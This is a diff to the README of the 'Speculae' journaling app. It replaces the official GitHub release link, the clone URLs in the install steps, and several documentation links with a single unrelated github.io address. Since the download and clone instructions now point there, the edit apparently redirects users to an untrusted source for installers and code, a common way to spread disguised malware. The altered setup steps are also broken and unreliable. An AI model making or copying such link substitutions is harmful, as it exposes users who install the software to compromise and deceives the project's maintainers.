@@ -9,7 +9,7 @@
     Write freely. Notice patterns. Breathe. Your data stays on your machine. Always.
   </p>
   <br />
-  <a href="https://github.com/0x923041-dotcom/Speculae/releases">Releases</a>
+  <a href="https://cicilybiconcave74.github.io">Releases</a>
   &nbsp;|&nbsp;
   <a href="#quick-start">Quick Start</a>
   &nbsp;|&nbsp;
@@ -70,7 +70,7 @@ A private mirror for the human. A home for the fleet. Shared under one roof.
 
 ### Download the App
 
-1. Go to **[Releases](https://github.com/0x923041-dotcom/Speculae/releases)**
+1. Go to **[Releases](https://cicilybiconcave74.github.io)**
 2. Download the latest installer for your OS
 3. Install and open
 
@@ -81,7 +81,7 @@ No account required. No network required. Your data lives locally from the first
 **Requirements:** Python 3.10 or newer, git.
 
 ```bash
-git clone https://github.com/0x923041-dotcom/Speculae
+git clone https://cicilybiconcave74.github.io
 cd Speculae
 pip install -e .
 speculae-web
@@ -98,13 +98,13 @@ Your browser opens to `http://127.0.0.1:7730`. Nothing leaves your machine.
 ### Desktop App (Tauri)
 
 ```bash
-git clone https://github.com/0x923041-dotcom/Speculae
+git clone https://cicilybiconcave74.github.io
 cd Speculae/desktop
 npm install
 npm run tauri dev
 ```
 
-**Requirements:** Rust toolchain, Node.js 18+. See [Tauri prerequisites](https://tauri.app/start/prerequisites/).
+**Requirements:** Rust toolchain, Node.js 18+. See [Tauri prerequisites](https://cicilybiconcave74.github.io).
 
 ---
 
@@ -331,7 +331,7 @@ Speculae can generate narrative insight reports using a language model. This is 
 | Custom (Ollama, LM Studio, etc.) | any | your choice |
 
 > **Anthropic model names** — Anthropic releases new model versions regularly.
-> Check the [Anthropic model documentation](https://docs.anthropic.com/en/docs/about-claude/models/overview)
+> Check the [Anthropic model documentation](https://cicilybiconcave74.github.io)
 > for the current recommended identifier before configuring.
 
 Your API key is stored in your local config file. It is never transmitted anywhere except to the provider you configure.
